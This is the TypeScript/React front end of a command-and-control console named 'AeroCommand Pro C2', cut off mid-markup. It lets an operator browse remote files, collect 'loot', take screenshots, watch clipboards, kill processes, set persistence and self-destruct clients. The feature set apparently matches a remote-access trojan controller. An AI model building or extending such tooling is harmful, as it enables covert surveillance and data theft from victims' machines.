import React, { useState, useEffect, useRef } from 'react';
import { 
  LayoutDashboard, Monitor, Terminal as TermIcon, FolderOpen, 
  Clipboard, Database, Settings, Play, Square, RefreshCw, Send, ShieldCheck, Cpu, HardDrive,
  Image as ImageIcon, FileText, FileCode, Archive, File as FileGeneric, Eye, X, ZoomIn, ZoomOut, Download, Copy, Check,
  Search, ArrowUpRight, TrendingUp, ChevronDown, Zap
} from 'lucide-react';
import { invoke } from '@tauri-apps/api/core';

interface Client {
  id: string;
  host: string;
  ip: string;
  pid: number;
  os: string;
  user: string;
  admin: boolean;
  first_seen: string;
  last_seen: string;
  status: string;
  cpu_usage: number;
  ram_usage: number;
  disk_usage: number;
  net_usage: number;
}

interface CommandLog {
  id: number;
  client_id: string;
  command: string;
  output: string;
  timestamp: string;
  status: string;
}

interface FileEntry {
  name: string;
  size: string;
  date: string;
  is_dir: boolean;
}

interface LootFile {
  name: string;
  path: string;
  size: number;
  timestamp: string;
  client: string;
}

interface ProcessEntry {
  name: string;
  pid: string;
  mem: string;
  user: string;
  cpu: string;
  title: string;
}

interface PreviewData {
  status: 'ok' | 'error' | 'unsupported';
  type?: 'image' | 'text' | 'binary';
  name?: string;
  path?: string;
  mime?: string;
  data?: string;
  content?: string;
  size?: string;
  message?: string;
}

const Tooltip = ({ children, text, position = 'top' }: { children: React.ReactNode, text: string, position?: 'top' | 'bottom' | 'left' | 'right' }) => {
  const posClasses = {
    top: 'bottom-full left-1/2 -translate-x-1/2 mb-2',
    bottom: 'top-full left-1/2 -translate-x-1/2 mt-2',
    left: 'right-full top-1/2 -translate-y-1/2 mr-2',
    right: 'left-full top-1/2 -translate-y-1/2 ml-2'
  };

  return (
    <div className="group relative flex items-center">
      {children}
      <div className={`absolute z-50 invisible group-hover:visible opacity-0 group-hover:opacity-100 transition-all duration-200 pointer-events-none whitespace-nowrap bg-slate-800 text-slate-100 text-[10px] px-2 py-1 rounded border border-c2border shadow-xl ${posClasses[position]}`}>
        {text}
        <div className={`absolute w-2 h-2 bg-slate-800 border-c2border transform rotate-45 ${
          position === 'top' ? 'bottom-[-5px] left-1/2 -translate-x-1/2 border-r border-b' :
          position === 'bottom' ? 'top-[-5px] left-1/2 -translate-x-1/2 border-l border-t' :
          position === 'left' ? 'right-[-5px] top-1/2 -translate-y-1/2 border-r border-t' :
          'left-[-5px] top-1/2 -translate-y-1/2 border-l border-b'
        }`}></div>
      </div>
    </div>
  );
};

export default function App() {
  const [activeTab, setActiveTab] = useState<'dashboard' | 'endpoints' | 'terminal' | 'files' | 'processes' | 'clipboard' | 'database' | 'settings'>('dashboard');
  const [uptime, setUptime] = useState('0:00:00');
  const [startTime] = useState(Date.now());
  const [serverRunning, setServerRunning] = useState(true);
  const [serverPort, setServerPort] = useState('9540');
  
  // Dashboard Metrics & Graphs
  const [cpuUsage, setCpuUsage] = useState(0);
  const [ramUsage, setRamUsage] = useState(0);
  const [netUsage, setNetUsage] = useState(0);
  const [diskUsage, setDiskUsage] = useState(0);
  const [cpuHistory, setCpuHistory] = useState<number[]>(new Array(20).fill(0));
  const [ramHistory, setRamHistory] = useState<number[]>(new Array(20).fill(0));
  const [netHistory, setNetHistory] = useState<number[]>(new Array(20).fill(0));
  const [diskHistory, setDiskHistory] = useState<number[]>(new Array(20).fill(0));

  // Real State from Backend
  const [clients, setClients] = useState<Client[]>([]);
  const [logs, setLogs] = useState<CommandLog[]>([]);
  const [printedLogIds, setPrintedLogIds] = useState<Set<number>>(new Set());
  const [selectedClientId, setSelectedClientId] = useState<string>('');
  const [activityFilter, setActivityFilter] = useState<'all' | 'files' | 'processes' | 'commands'>('all');
  
  // File Explorer State
  const [fileSubTab, setFileSubTab] = useState<'explorer' | 'loot'>('explorer');
  const [currentPath, setCurrentPath] = useState<string>('');
  const [fileList, setFileList] = useState<FileEntry[]>([]);
  const [isFilesLoading, setIsFilesLoading] = useState(false);
  const [fileError, setFileError] = useState<string>('');
  const [fileTruncated, setFileTruncated] = useState(false);
  const [fileTotalCount, setFileTotalCount] = useState(0);
  const navHistoryRef = useRef<string[]>([]);
  const navCounterRef = useRef(0);
  const loadingTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  // Directory content cache: normalizedPath -> { items, truncated, count }
  const dirCacheRef = useRef<Map<string, { items: FileEntry[], truncated: boolean, count: number }>>(new Map());
  // Normalize a path string to a consistent cache key (forward slashes, lowercase drive letter)
  const normPath = (p: string) => p.replace(/\\/g, '/').replace(/\/+$/, '').toLowerCase();

  // File Preview Modal State
  const [previewOpen, setPreviewOpen] = useState(false);
  const [previewData, setPreviewData] = useState<PreviewData | null>(null);
  const [isPreviewLoading, setIsPreviewLoading] = useState(false);
  const [previewZoom, setPreviewZoom] = useState(1);
  const [copiedPath, setCopiedPath] = useState(false);
  
  // Loot Gallery State
  const [lootFiles, setLootFiles] = useState<LootFile[]>([]);
  const [selectedLoot, setSelectedLoot] = useState<LootFile | null>(null);
  const [lootContent, setLootContent] = useState<string | null>(null);

  // Process Manager State
  const [processList, setProcessList] = useState<ProcessEntry[]>([]);
  const [isProcessesLoading, setIsProcessesLoading] = useState(false);
  const [processSearch, setProcessSearch] = useState('');

  // Terminal State
  const [termInput, setTermInput] = useState('');
  const [termLogs, setTermLogs] = useState<string[]>([
    "[+] AeroCommand Pro C2 Server v3.5 initialized",
    "[+] Listening on port 9540...",
  ]);
  const [suggestions, setSuggestions] = useState<string[]>([]);
  const quickCommands = [
    { label: "screenshot", cmd: "screenshot", tip: "Capture remote screen" },
    { label: "sysinfo", cmd: "sysinfo", tip: "Get system details" },
    { label: "clip", cmd: "clip", tip: "Read clipboard" },
    { label: "clipwatch", cmd: "clipwatch", tip: "Monitor clipboard" },
    { label: "clipstop", cmd: "clipstop", tip: "Stop monitoring" },
    { label: "tasklist", cmd: "tasklist", tip: "Show running apps" },
    { label: "whoami", cmd: "whoami", tip: "Current user info" },
    { label: "ipconfig", cmd: "ipconfig", tip: "Network settings" },
    { label: "dir", cmd: "dir", tip: "List files" },
    { label: "kill", cmd: "kill", tip: "Self-destruct client" },
    { label: "pwd", cmd: "pwd", tip: "Current directory" },
    { label: "ls", cmd: "ls", tip: "Browse folders" },
    { label: "persist", cmd: "persist", tip: "Set auto-start" },
    { label: "message", cmd: "dialog Hello|AeroCommand", tip: "Show popup alert" },
    { label: "speed", cmd: "sleep 10", tip: "Set check-in delay" },
    { label: "calc", cmd: "calc", tip: "Open calculator" },
    { label: "notepad", cmd: "notepad", tip: "Open notepad" },
    { label: "lock", cmd: "rundll32.exe user32.dll,LockWorkStation", tip: "Lock remote PC" },
    { label: "shutdown", cmd: "shutdown /s /t 60", tip: "Turn off PC" },
    { label: "restart", cmd: "shutdown /r /t 60", tip: "Reboot PC" }
  ];

  const scrollRef = useRef<HTMLDivElement>(null);

  // Auto-scroll to bottom of terminal
  useEffect(() => {
    if (scrollRef.current) {
      scrollRef.current.scrollTop = scrollRef.current.scrollHeight;
    }
  }, [termLogs]);

  const logsRef = useRef<CommandLog[]>([]);
  const printedIdsRef = useRef<Set<number>>(new Set());

  // Data Fetching Ticker — poll faster (1s) when browsing files for snappier navigation
  useEffect(() => {
    const pollInterval = (activeTab === 'files' && isFilesLoading) ? 1000 : 2000;
    const fetchData = async () => {
      try {
        const backendClients = await invoke<Client[]>('get_clients');
        const backendLogs = await invoke<CommandLog[]>('get_logs');
        setClients(backendClients);
        
        const terminalUpdates: string[] = [];
        const currentPrintedIds = printedIdsRef.current;
        let hasNewPrinted = false;

        backendLogs.forEach(log => {
          if (log.status === 'SUCCESS' && !currentPrintedIds.has(log.id)) {
            // 1. If this is a file listing payload, parse it for the file explorer
            if (log.output.startsWith('[JSON_FILES]') || log.command.startsWith('ls') || log.command === 'dir') {
              parseFileList(log.output);
            }
            // 2. If this is a preview payload, parse it for the preview modal
            else if (log.output.startsWith('[JSON_PREVIEW]') || log.command.startsWith('preview ')) {
              try {
                const jsonStr = log.output.replace('[JSON_PREVIEW]', '');
                const parsed = JSON.parse(jsonStr);
                setPreviewData(parsed);
                setIsPreviewLoading(false);
              } catch (e) {
                console.error("Failed to parse preview response", e);
                setIsPreviewLoading(false);
              }
            }
            // 3. If this is a process manager payload, parse it
            else if (log.output.startsWith('[JSON_PROCS]') || log.command === 'ps') {
              try {
                const jsonStr = log.output.replace('[JSON_PROCS]', '');
                const procs = JSON.parse(jsonStr);
                setProcessList(procs);
                setIsProcessesLoading(false);
              } catch (e) {
                console.error("Failed to parse processes", e);
              }
            }
            // 4. If this was a 'pwd' command, only set if it is a clean directory string
            else if (log.command === 'pwd') {
              const trimmed = log.output.trim();
              if (trimmed && !trimmed.startsWith('[') && !trimmed.startsWith('{') && !trimmed.includes('\n') && trimmed.length < 300) {
                setCurrentPath(trimmed);
              }
            }

            // ONLY print to the interactive terminal if it's NOT an internal GUI background payload
            const isInternalGuiJson = 
              log.output.startsWith('[JSON_FILES]') ||
              log.output.startsWith('[JSON_PREVIEW]') ||
              log.output.startsWith('[JSON_PROCS]');

            if (!isInternalGuiJson) {
              terminalUpdates.push(`[+] Result from ${log.client_id}:`);
              terminalUpdates.push(log.output);
            }

            currentPrintedIds.add(log.id);
            hasNewPrinted = true;
          }
        });

        if (terminalUpdates.length > 0) {
          setTermLogs(prev => [...prev, ...terminalUpdates]);
        }
        
        if (hasNewPrinted) {
          setPrintedLogIds(new Set(currentPrintedIds));
        }

        setLogs(backendLogs);
        logsRef.current = backendLogs;
        
        // Fetch loot if on files tab
        if (activeTab === 'files') {
          const loot = await invoke<LootFile[]>('get_loot');
          setLootFiles(loot);
        }
      } catch (err) {
        console.error("Failed to fetch data from backend", err);
      }
    };

    const interval = setInterval(fetchData, pollInterval);
    return () => clearInterval(interval);
  }, [activeTab, isFilesLoading]);

  // Tab Initialization Logic
  useEffect(() => {
    if (clients.length === 0) return;

    if (activeTab === 'processes') {
      // Auto-fetch processes only if the list is empty
      if (processList.length === 0 && !isProcessesLoading) {
        fetchProcesses();
      }
    } else if (activeTab === 'files') {
      // Auto-browse initial folder if not loaded
      if (!currentPath && !isFilesLoading && fileList.length === 0) {
        browseFolder('.');
      }
    }
  }, [activeTab, clients.length]);

  const parseFileList = (output: string) => {
    // Clear loading timeout since we got a response
    if (loadingTimerRef.current) {
      clearTimeout(loadingTimerRef.current);
      loadingTimerRef.current = null;
    }
    setFileError('');

    // Fast path: JSON response from updated client
    if (output.startsWith('[JSON_FILES]')) {
      try {
        const data = JSON.parse(output.replace('[JSON_FILES]', ''));
        const path = data.path || '';
        const items = data.items || [];
        const truncated = data.truncated || false;
        const count = data.count || 0;
        // Store in cache by RESOLVED path (what the server actually returned)
        // This means SPECIAL:Desktop gets cached as 'c:/users/shakir/desktop'
        if (path) dirCacheRef.current.set(normPath(path), { items, truncated, count });
        setCurrentPath(path);
        setFileList(items);
        setFileTruncated(truncated);
        setFileTotalCount(count);
        setIsFilesLoading(false);
        return;
      } catch (e) {
        console.error('Failed to parse JSON file list', e);
      }
    }

    // Check for error responses
    if (output.startsWith('[-]')) {
      setFileError(output);
      setIsFilesLoading(false);
      return;
    }

    // Fallback: legacy text parser for backwards compatibility
    const lines = output.split('\n');
    const files: FileEntry[] = [];
    
    const pathMatch = output.match(/\[\+\] Directory: (.*)/);
    if (pathMatch) {
      setCurrentPath(pathMatch[1].trim());
    } else if (output.includes('System Drives')) {
      setCurrentPath('System Drives');
    }

    lines.forEach(line => {
      if (line.includes('─') || line.includes('SIZE') || line.includes('TYPE') || line.includes('Directory:') || line.includes('System Drives') || !line.trim()) return;
      
      const isDir = line.includes('DIR') || line.includes('DRIVE');
      const parts = line.trim().split(/\s{2,}/);
      if (parts.length >= 3) {
        files.push({
          size: parts[0],
          date: parts[1],
          name: parts[2].replace(/\/$/, ''),
          is_dir: isDir
        });
      }
    });
    setFileList(files);
    setFileTruncated(false);
    setFileTotalCount(files.length);
    setIsFilesLoading(false);
  };

  const listDrives = () => {
    if (clients.length === 0) return;
    // Push current path to history before navigating
    if (currentPath) {
      navHistoryRef.current.push(currentPath);
    }
    setIsFilesLoading(true);
    setFileError('');
    setFileList([]);
    // Set loading timeout — auto-clear after 15s
    if (loadingTimerRef.current) clearTimeout(loadingTimerRef.current);
    loadingTimerRef.current = setTimeout(() => {
      setIsFilesLoading(false);
      setFileError('Loading timed out. The client may be unreachable.');
    }, 15000);
    executeCommand('ls DRIVES', true);
  };

  const browseFolder = (path: string, forceRefresh = false) => {
    if (clients.length === 0) return;
    // Push current path to history before navigating (don't push if same path)
    if (currentPath && normPath(currentPath) !== normPath(path)) {
      navHistoryRef.current.push(currentPath);
    }
    // Check cache — serve instantly unless forceRefresh is set
    if (!forceRefresh) {
      const cacheKey = normPath(path);
      const cached = dirCacheRef.current.get(cacheKey);
      if (cached) {
        setCurrentPath(path);
        setFileList(cached.items);
        setFileTruncated(cached.truncated);
        setFileTotalCount(cached.count);
        setFileError('');
        setIsFilesLoading(false);
        return;
      }
    } else {
      // Force refresh: evict this path from cache so fresh data is stored
      dirCacheRef.current.delete(normPath(path));
    }
    // No cache hit — send network request
    navCounterRef.current += 1;
    setIsFilesLoading(true);
    setFileError('');
    setFileList([]);
    if (loadingTimerRef.current) clearTimeout(loadingTimerRef.current);
    loadingTimerRef.current = setTimeout(() => {
      setIsFilesLoading(false);
      setFileError('Loading timed out. The client may be unreachable.');
    }, 15000);
    executeCommand(`ls "${path}"`, true);
  };

  const goBack = () => {
    const history = navHistoryRef.current;
    if (history.length > 0) {
      const prevPath = history.pop()!;
      if (prevPath === 'System Drives') {
        listDrives();
      } else {
        // Check cache first — instant back navigation without network round-trip
        const cached = dirCacheRef.current.get(normPath(prevPath));
        if (cached) {
          setCurrentPath(prevPath);
          setFileList(cached.items);
          setFileTruncated(cached.truncated);
          setFileTotalCount(cached.count);
          setFileError('');
          setIsFilesLoading(false);
          return;
        }
        // Fallback: re-fetch if not in cache
        navCounterRef.current += 1;
        setIsFilesLoading(true);
        setFileError('');
        setFileList([]);
        if (loadingTimerRef.current) clearTimeout(loadingTimerRef.current);
        loadingTimerRef.current = setTimeout(() => {
          setIsFilesLoading(false);
          setFileError('Loading timed out. The client may be unreachable.');
        }, 15000);
        executeCommand(`ls "${prevPath}"`, true);
      }
    }
  };

  // Helper: render clickable breadcrumbs from the current path
  const renderBreadcrumbs = () => {
    if (!currentPath || currentPath === 'System Drives' || currentPath.startsWith('[') || currentPath.startsWith('{') || currentPath.length > 260) {
      return <span className="text-[10px] font-mono text-slate-500 mt-0.5">{currentPath === 'System Drives' ? 'System Drives' : 'Click refresh to start browsing...'}</span>;
    }
    // Split path into segments (handle both / and \ separators)
    const normalized = currentPath.replace(/\\/g, '/');
    const segments = normalized.split('/').filter(Boolean);
    return (
      <div className="flex items-center flex-wrap gap-0.5 mt-0.5">
        {segments.map((seg, i) => {
          const partialPath = segments.slice(0, i + 1).join('/');
          // Add back drive colon for Windows paths (e.g. "C:" not "C")
          const clickPath = i === 0 && seg.endsWith(':') ? seg + '/' : partialPath;
          const isLast = i === segments.length - 1;
          return (
            <React.Fragment key={i}>
              {i > 0 && <span className="text-slate-600 text-[10px] mx-0.5">/</span>}
              <button
                onClick={() => !isLast && browseFolder(clickPath)}
                className={`text-[10px] font-mono px-1 py-0.5 rounded transition-colors ${
                  isLast
                    ? 'text-c2accent font-bold cursor-default'
                    : 'text-slate-400 hover:text-c2accent hover:bg-slate-800 cursor-pointer'
                }`}
              >
                {seg}
              </button>
            </React.Fragment>
          );
        })}
      </div>
    );
  };

  // Helper: Get file icon and preview capability based on extension
  const getFileMeta = (file: FileEntry) => {
    if (file.is_dir) {
      return { icon: <FolderOpen className="w-4 h-4 text-amber-400 shrink-0" />, isPreviewable: false, type: 'Folder' };
    }
    const ext = file.name.split('.').pop()?.toLowerCase() || '';
    if (['png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp', 'ico', 'svg'].includes(ext)) {
      return { icon: <ImageIcon className="w-4 h-4 text-emerald-400 shrink-0" />, isPreviewable: true, type: 'Image' };
    }
    if (['txt', 'log', 'md', 'json', 'yaml', 'yml', 'xml', 'csv', 'ini', 'cfg', 'env', 'toml'].includes(ext)) {
      return { icon: <FileText className="w-4 h-4 text-sky-400 shrink-0" />, isPreviewable: true, type: 'Document' };
    }
    if (['py', 'js', 'ts', 'jsx', 'tsx', 'html', 'css', 'cpp', 'c', 'cs', 'rs', 'go', 'php', 'sql', 'sh', 'bat', 'ps1', 'cmd'].includes(ext)) {
      return { icon: <FileCode className="w-4 h-4 text-violet-400 shrink-0" />, isPreviewable: true, type: 'Source Code' };
    }
    if (['zip', 'rar', '7z', 'tar', 'gz', 'bz2', 'xz'].includes(ext)) {
      return { icon: <Archive className="w-4 h-4 text-amber-500 shrink-0" />, isPreviewable: false, type: 'Archive' };
    }
    return { icon: <FileGeneric className="w-4 h-4 text-slate-400 shrink-0" />, isPreviewable: false, type: 'File' };
  };

  // Trigger instant preview in modal
  const requestPreview = (filePath: string, fileName: string) => {
    if (clients.length === 0) return;
    setPreviewOpen(true);
    setIsPreviewLoading(true);
    setPreviewData({ status: 'ok', name: fileName, path: filePath });
    setPreviewZoom(1);
    setCopiedPath(false);
    executeCommand(`preview "${filePath}"`, true);
  };

  // Close preview on ESC
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'Escape' && previewOpen) {
        setPreviewOpen(false);
      }
    };
    window.addEventListener('keydown', handleKeyDown);
    return () => window.removeEventListener('keydown', handleKeyDown);
  }, [previewOpen]);

  // Helper: Format raw C2 activity logs into human-readable event items
  const formatActivityLog = (log: CommandLog) => {
    const output = log.output || '';
    const cmd = log.command || '';

    if (output.startsWith('[JSON_FILES]')) {
      try {
        const data = JSON.parse(output.replace('[JSON_FILES]', ''));
        const path = data.path || 'Directory';
        return {
          category: 'files',
          icon: <FolderOpen className="w-4 h-4 text-amber-400 shrink-0" />,
          badge: 'EXPLORER',
          badgeClass: 'bg-amber-500/10 text-amber-400 border-amber-500/30',
          title: `Explored Directory`,
          detail: path,
          meta: `${data.count || (data.items ? data.items.length : 0)} items found`
        };
      } catch {}
    }

    if (output.startsWith('[JSON_PREVIEW]')) {
      try {
        const data = JSON.parse(output.replace('[JSON_PREVIEW]', ''));
        const isImg = data.type === 'image';
        return {
          category: 'files',
          icon: isImg ? <ImageIcon className="w-4 h-4 text-emerald-400 shrink-0" /> : <FileText className="w-4 h-4 text-sky-400 shrink-0" />,
          badge: isImg ? 'IMAGE' : 'PREVIEW',
          badgeClass: isImg ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30' : 'bg-sky-500/10 text-sky-400 border-sky-500/30',
          title: isImg ? `Live Image Preview` : `Document Loaded`,
          detail: data.name || 'File',
          meta: data.size || 'Streamed'
        };
      } catch {}
    }

    if (output.startsWith('[JSON_PROCS]')) {
      try {
        const data = JSON.parse(output.replace('[JSON_PROCS]', ''));
        const count = Array.isArray(data) ? data.length : 0;
        return {
          category: 'processes',
          icon: <Cpu className="w-4 h-4 text-violet-400 shrink-0" />,
          badge: 'PROCESSES',
          badgeClass: 'bg-violet-500/10 text-violet-400 border-violet-500/30',
          title: `Process Map Synchronized`,
          detail: `${count} active processes enumerated`,
          meta: 'Process Table'
        };
      } catch {}
    }

    if (cmd.startsWith('download ')) {
      const fileName = cmd.split('download ')[1]?.replace(/["']/g, '').split(/[/\\]/).pop() || 'Artifact';
      return {
        category: 'files',
        icon: <Download className="w-4 h-4 text-sky-400 shrink-0" />,
        badge: 'DOWNLOAD',
        badgeClass: 'bg-sky-500/10 text-sky-400 border-sky-500/30',
        title: `Artifact Saved to Loot`,
        detail: fileName,
        meta: 'Loot Store'
      };
    }

    if (cmd === 'screenshot') {
      return {
        category: 'commands',
        icon: <Monitor className="w-4 h-4 text-cyan-400 shrink-0" />,
        badge: 'SCREENSHOT',
        badgeClass: 'bg-cyan-500/10 text-cyan-400 border-cyan-500/30',
        title: `Display Screenshot Captured`,
        detail: 'Remote monitor frame saved to loot gallery',
        meta: 'Display Frame'
      };
    }

    if (cmd === 'sysinfo') {
      return {
        category: 'commands',
        icon: <ShieldCheck className="w-4 h-4 text-emerald-400 shrink-0" />,
        badge: 'SYSINFO',
        badgeClass: 'bg-emerald-500/10 text-emerald-400 border-emerald-500/30',
        title: `System Diagnostics Gathered`,
        detail: output.split('\n')[0] || 'Hardware & OS diagnostics',
        meta: 'System Telemetry'
      };
    }

    if (cmd.startsWith('killproc ')) {
      const target = cmd.split('killproc ')[1]?.replace(/["']/g, '');
      return {
        category: 'processes',
        icon: <Square className="w-4 h-4 text-rose-400 shrink-0" />,
        badge: 'KILL',
        badgeClass: 'bg-rose-500/10 text-rose-400 border-rose-500/30',
        title: `Terminated Process`,
        detail: `PID/Target: ${target}`,
        meta: 'Process Kill'
      };
    }

    if (cmd.startsWith('clip')) {
      return {
        category: 'commands',
        icon: <Clipboard className="w-4 h-4 text-amber-300 shrink-0" />,
        badge: 'CLIPBOARD',
        badgeClass: 'bg-amber-500/10 text-amber-300 border-amber-500/30',
        title: cmd === 'clipwatch' ? 'Clipboard Monitor Activated' : 'Clipboard Buffer Checked',
        detail: output.substring(0, 70) || cmd,
        meta: 'Clipboard Stream'
      };
    }

    const firstLine = output.trim().split('\n')[0] || 'Executed successfully';
    return {
      category: 'commands',
      icon: <TermIcon className="w-4 h-4 text-slate-400 shrink-0" />,
      badge: 'SHELL',
      badgeClass: 'bg-slate-800 text-slate-400 border-slate-700',
      title: `Executed: ${cmd}`,
      detail: firstLine.length > 70 ? firstLine.substring(0, 70) + '...' : firstLine,
      meta: log.status
    };
  };

  const fetchProcesses = (silent: boolean = true) => {
    if (clients.length === 0) return;
    setIsProcessesLoading(true);
    executeCommand('ps', silent);
  };

  const killProcess = (pidOrName: string) => {
    if (clients.length === 0) return;
    executeCommand(`killproc "${pidOrName}"`);
    // Refresh after a short delay
    setTimeout(fetchProcesses, 2000);
  };

  const viewLoot = async (file: LootFile) => {
    setSelectedLoot(file);
    try {
      const content = await invoke<string>('get_loot_file', { path: file.path });
      setLootContent(content);
    } catch (err) {
      console.error("Failed to load loot content", err);
    }
  };

  // Uptime & Resource Ticker
  useEffect(() => {
    const timer = setInterval(() => {
      const diff = Math.floor((Date.now() - startTime) / 1000);
      const hrs = Math.floor(diff / 3600);
      const mins = Math.floor((diff % 3600) / 60);
      const secs = diff % 60;
      setUptime(`${hrs}:${mins < 10 ? '0' : ''}${mins}:${secs < 10 ? '0' : ''}${secs}`);

      // Use real telemetry from the first active client if available
      // In a real scenario, you might want to track which client is selected
      const activeClient = clients.length > 0 ? clients[0] : null;
      
      const newCpu = activeClient ? activeClient.cpu_usage : 0;
      const newRam = activeClient ? activeClient.ram_usage : 0;
      const newNet = activeClient ? activeClient.net_usage : 0;
      const newDisk = activeClient ? activeClient.disk_usage : 0;
      
      setCpuUsage(newCpu);
      setRamUsage(newRam);
      setNetUsage(newNet);
      setDiskUsage(newDisk);

      setCpuHistory(prev => [...prev.slice(1), newCpu]);
      setRamHistory(prev => [...prev.slice(1), newRam]);
      setNetHistory(prev => [...prev.slice(1), newNet]);
      setDiskHistory(prev => [...prev.slice(1), newDisk]);
    }, 1000);
    return () => clearInterval(timer);
  }, [startTime, clients]);

  // Autocomplete handling
  const handleInputChange = (val: string) => {
    setTermInput(val);
    if (!val.trim()) {
      setSuggestions([]);
      return;
    }
    const matches = quickCommands
      .filter(item => item.label.toLowerCase().includes(val.toLowerCase()) || item.cmd.toLowerCase().includes(val.toLowerCase()))
      .map(item => item.cmd);
    setSuggestions(matches);
  };

  const executeCommand = async (cmd: string, silent: boolean = false) => {
    if (!cmd.trim() || clients.length === 0) return;
    
    const targetId = selectedClientId && clients.some(c => c.id === selectedClientId)
      ? selectedClientId
      : (clients[0]?.id || '');
    if (!silent) {
      setTermLogs(prev => [...prev, `> ${cmd}`]);
    }
    
    try {
      await invoke('send_command', { clientId: targetId, command: cmd });
      if (!silent) {
        setTermLogs(prev => [...prev, `[+] Command queued for ${targetId}`]);
      }
    } catch (err) {
      if (!silent) {
        setTermLogs(prev => [...prev, `[-] Error sending command: ${err}`]);
      }
    }

    setTermInput('');
    setSuggestions([]);
  };

  return (
    <div className="flex h-screen w-screen bg-c2bg text-slate-100 overflow-hidden font-sans select-none antialiased">
      
      {/* ==================== SIDEBAR ==================== */}
      <div className="w-60 bg-c2sidebar border-r border-c2border flex flex-col justify-between p-3 shrink-0">
        <div>
          {/* Windows-style Header */}
          <div className="flex items-center space-x-2.5 px-2 py-3 mb-2 border-b border-c2border/60">
            <div className="w-8 h-8 rounded-lg overflow-hidden flex items-center justify-center shrink-0">
              <img src="/logo.png" alt="AeroCommand Logo" className="w-full h-full object-contain" />
            </div>
            <div>
              <span className="font-bold text-sm text-white tracking-tight block">AeroCommand</span>
              <span className="text-[10px] text-slate-400 font-semibold block uppercase tracking-wider">C2 Console v3.5</span>
            </div>
          </div>

          {/* Main Navigation Menu */}
          <div className="space-y-0.5 mt-2">
            <div className="text-[10px] uppercase font-bold text-slate-500 tracking-wider px-2.5 py-1">Navigation</div>
            {[
              { id: 'dashboard', label: 'Dashboard', icon: LayoutDashboard, tip: 'Fleet overview and live telemetry' },
              { id: 'endpoints', label: 'Endpoints', icon: Monitor, tip: 'Manage connected remote endpoints' },
              { id: 'terminal', label: 'Command Center', icon: TermIcon, tip: 'Interactive command shell' },
              { id: 'processes', label: 'Process Manager', icon: Cpu, tip: 'Process telemetry & termination' },
              { id: 'files', label: 'File & Loot', icon: FolderOpen, tip: 'Remote filesystem & live preview' },
              { id: 'clipboard', label: 'Clipboard Stream', icon: Clipboard, tip: 'Live clipboard monitor' },
              { id: 'database', label: 'History & Logs', icon: Database, tip: 'Historical command executions' },
              { id: 'settings', label: 'Server Config', icon: Settings, tip: 'C2 network & server parameters' },
            ].map((item) => {
              const Icon = item.icon;
              const isActive = activeTab === item.id;
              return (
                <Tooltip key={item.id} text={item.tip} position="right">
                  <button
                    onClick={() => setActiveTab(item.id as any)}
                    className={`w-full flex items-center space-x-2.5 px-2.5 py-2 rounded-md text-xs font-medium transition-colors ${
                      isActive 
                        ? 'bg-c2accent text-white font-semibold shadow-sm' 
                        : 'text-slate-300 hover:bg-c2card hover:text-white'
                    }`}
                  >
                    <Icon className={`w-4 h-4 ${isActive ? 'text-white' : 'text-slate-400'}`} />
                    <span>{item.label}</span>
                  </button>
                </Tooltip>
              );
            })}
          </div>
        </div>

        {/* Footer Listener Status */}
        <div className="p-2.5 bg-c2card border border-c2border rounded-lg">
          <div className="flex items-center justify-between text-xs text-slate-300 mb-1">
            <span className="text-[11px] font-semibold">Listener Status</span>
            <span className="flex items-center text-emerald-400 text-[10px] font-bold">
              <span className="h-1.5 w-1.5 rounded-full bg-emerald-400 mr-1.5 animate-pulse"></span>
              ACTIVE
            </span>
          </div>
          <div className="text-[10px] text-slate-400 font-mono flex items-center justify-between mt-1">
            <span>Port: {serverPort}</span>
            <span>{clients.length} Client{clients.length === 1 ? '' : 's'}</span>
          </div>
        </div>
      </div>

      {/* ==================== MAIN WORKSPACE ==================== */}
      <div className="flex-1 flex flex-col overflow-hidden bg-c2bg">
        
        {/* WINDOWS TOOLBAR */}
        <header className="h-12 px-5 flex items-center justify-between border-b border-c2border bg-c2sidebar/60 shrink-0">
          {/* View Switcher Segmented Control */}
          <div className="flex items-center space-x-1 bg-c2card border border-c2border rounded-md p-0.5">
            {[
              { label: 'Overview', tab: 'dashboard' },
              { label: 'Endpoints', tab: 'endpoints' },
              { label: 'Files', tab: 'files' },
              { label: 'Terminal', tab: 'terminal' },
            ].map((pill) => (
              <button
                key={pill.tab}
                onClick={() => setActiveTab(pill.tab as any)}
                className={`px-3 py-1 rounded text-xs font-medium transition-colors ${
                  activeTab === pill.tab
                    ? 'bg-c2accent text-white font-semibold shadow-sm'
                    : 'text-slate-300 hover:text-white'
                }`}
              >
                {pill.label}
              </button>
            ))}
          </div>

          {/* Center Search / Command Box */}
          <div className="flex items-center space-x-2 bg-c2pill border border-c2border rounded-md px-3 py-1.5 w-72 text-xs text-slate-300">
            <Search className="w-3.5 h-3.5 text-slate-400 shrink-0" />
            <input
              type="text"
              placeholder="Search endpoints or run command..."
              value={termInput}
              onChange={(e) => handleInputChange(e.target.value)}
              onKeyDown={(e) => {
                if (e.key === 'Enter') {
                  executeCommand(termInput);
                  setActiveTab('terminal');
                }
              }}
              className="bg-transparent text-xs text-white placeholder:text-slate-500 outline-none w-full font-sans"
            />
          </div>

          {/* Right Actions */}
          <div className="flex items-center space-x-2">
            {/* Target Machine Selector */}
            {clients.length > 1 ? (
              <div className="flex items-center space-x-1.5 bg-c2card border border-c2border rounded-md px-2.5 py-1">
                <span className="text-[10px] text-slate-400 uppercase font-bold">Target:</span>
                <select
                  value={selectedClientId || (clients[0]?.id || '')}
                  onChange={(e) => setSelectedClientId(e.target.value)}
                  className="bg-transparent text-xs font-mono text-c2cyan font-bold outline-none cursor-pointer"
                >
                  {clients.map(c => (
                    <option key={c.id} value={c.id} className="bg-slate-900 text-slate-200">
                      {c.host} ({c.ip})
                    </option>
                  ))}
                </select>
              </div>
            ) : (
              <div className="flex items-center space-x-2 bg-c2card border border-c2border rounded-md px-3 py-1 text-xs">
                <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 shrink-0" />
                <span className="text-slate-200 font-mono font-medium">
                  {(clients.find(c => c.id === selectedClientId) || clients[0])?.host || 'None Selected'}
                </span>
              </div>
            )}

            {/* Server Control Button */}
            <button 
              onClick={() => setServerRunning(!serverRunning)}
              className={`px-3 py-1 rounded-md text-xs font-semibold flex items-center space-x-1.5 border transition-colors ${
                serverRunning 
